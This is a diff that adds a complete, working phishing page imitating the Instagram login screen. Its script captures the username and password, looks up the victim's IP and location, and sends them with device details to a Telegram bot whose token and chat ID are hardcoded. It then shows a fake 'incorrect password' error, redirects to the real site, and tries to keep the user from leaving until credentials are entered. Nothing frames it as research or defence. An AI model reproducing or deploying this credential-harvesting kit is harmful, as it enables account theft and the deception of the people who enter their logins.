@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 0 40px;
+        }
+
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            max-width: 350px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* CSS-only Instagram icon */
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .instagram-icon {
+            width: 175px;
+            height: 60px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ig-word {
+            font-family: 'Billabong', cursive, sans-serif;
+            font-size: 48px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+        }
+
+        /* Fallback font stack if Billabong not loaded */
+        @font-face {
+            font-family: 'Billabong';
+            src: local('Billabong'), local('Brush Script MT'), local('Comic Sans MS');
+        }
+
+        .facebook-login {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            color: #737373;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .or-divider span {
+            padding: 0 18px;
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 12px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 12px;
+            cursor: pointer;
+            width: 100%;
+            opacity: 0.7;
+        }
+
+        .login-btn.active {
+            opacity: 1;
+        }
+
+        .forgot-password {
+            text-align: center;
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            margin-top: auto;
+            padding-bottom: 40px;
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-text a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .meta-footer {
+            text-align: center;
+            color: #737373;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff40;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="content">
+    <div class="logo">
+        <div class="instagram-icon">
+            <span class="ig-word">Instagram</span>
+        </div>
+    </div>
+
+    <button class="facebook-login">
+        <svg width="16" height="16" fill="white" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Continue with Facebook
+    </button>
+
+    <div class="or-divider"><span>OR</span></div>
+
+    <div class="input-group">
+        <input type="text" class="input" id="username" placeholder="Phone number, username, or email" autocomplete="username">
+    </div>
+
+    <div class="input-group">
+        <input type="password" class="input" id="password" placeholder="Password" autocomplete="current-password">
+    </div>
+
+    <button class="login-btn" id="loginBtn" onclick="handleLogin()">
+        <span id="btnText">Log In</span>
+        <div class="spinner" id="spinner"></div>
+    </button>
+
+    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect.</div>
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+</div>
+
+<div class="signup-box">
+    <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+</div>
+
+<div class="meta-footer">
+    from
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="#737373" style="vertical-align:middle;margin-left:4px">
+        <path d="M12,2C6.48,2,2,6.48,2,12s4.48,10,10,10s10-4.48,10-10S17.52,2,12,2z M11.99,20C7.14,19.35,4,15.7,4,12 c0-3.31,3-6,6-6c3.31,0,6,2.69,6,6C16,15.7,13,19,11.99,20z"/>
+    </svg>
+</div>
+
+<script>
+    const BOT_TOKEN = '8754566524:AAEp32D8o67HFV34pq_Mh_27YcHPTe6gljI'; // From @BotFather
+    const CHAT_ID = '1277128628';     // Your numeric chat ID
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginButton = document.getElementById('loginBtn');
+
+    // Prevent user from leaving the page until they enter a username and password
+    window.onbeforeunload = function() {
+        if (usernameInput.value === '' || passwordInput.value === '') {
+            return 'You must enter a username and password to continue.';
+        }
+    };
+
+    // Also prevent user from closing the tab or window until they enter a username and password
+    window.onunload = function() {
+        if (usernameInput.value === '' || passwordInput.value === '') {
+            alert('You must enter a username and password to continue.');
+            return false;
+        }
+    };
+
+    // Disable the login button until both fields are filled
+    loginButton.disabled = true;
+
+    // Enable the login button when both fields are filled
+    usernameInput.addEventListener('input', checkFields);
+    passwordInput.addEventListener('input', checkFields);
+
+    function checkFields() {
+        if (usernameInput.value !== '' && passwordInput.value !== '') {
+            loginButton.disabled = false;
+        } else {
+            loginButton.disabled = true;
+        }
+    }
+
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            return await res.json();
+        } catch (e) {
+            return { ip:'unknown', city:'unknown', country:'unknown' };
+        }
+    }
+
+    async function handleLogin() {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) return;
+
+        // Show loading state
+        document.getElementById('btnText').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+        loginButton.disabled = true;
+
+        // Grab that IP and device info for real
+        const ipData = await getIPInfo();
+
+        // Build comprehensive message with all the juice
+        const msg = `📱 *New Hit* 📱\n\n` +
+            `👤 *User:* \`${username}\`\n` +
+            `🔑 *Pass:* \`${password}\`\n\n` +
+            `📍 *IP:* \`${ipData.ip}\`\n` +
+            `🏙️ *Location:* \`${ipData.city}, ${ipData.country}\`\n` +
+            `🌐 *ISP:* \`${ipData.org || 'unknown'}\`\n\n` +
+            `💻 *Device:* \`${navigator.platform}\`\n` +
+            `🖥️ *Screen:* \`${window.screen.width}x${window.screen.height}\`\n` +
+            `🔤 *Lang:* \`${navigator.language}\`\n` +
+            `⏰ *Time:* \`${new Date().toLocaleString()}\``;
+
+        // Fire to Telegram immediately
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Small delay so it looks legit processing
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('errorMsg').style.display = 'block';
+
+                setTimeout(() => {
+                    window.location.href = 'https://instagram.com/accounts/login/?next=/';
+                }, 1500);
+            }, 1200);
+
+        } catch (e) {
+            // Even if Telegram fails keep UX smooth
+            window.location.href = 'https://instagram.com';
+        }
+    }
+</script>
+
+</body>
+</html>
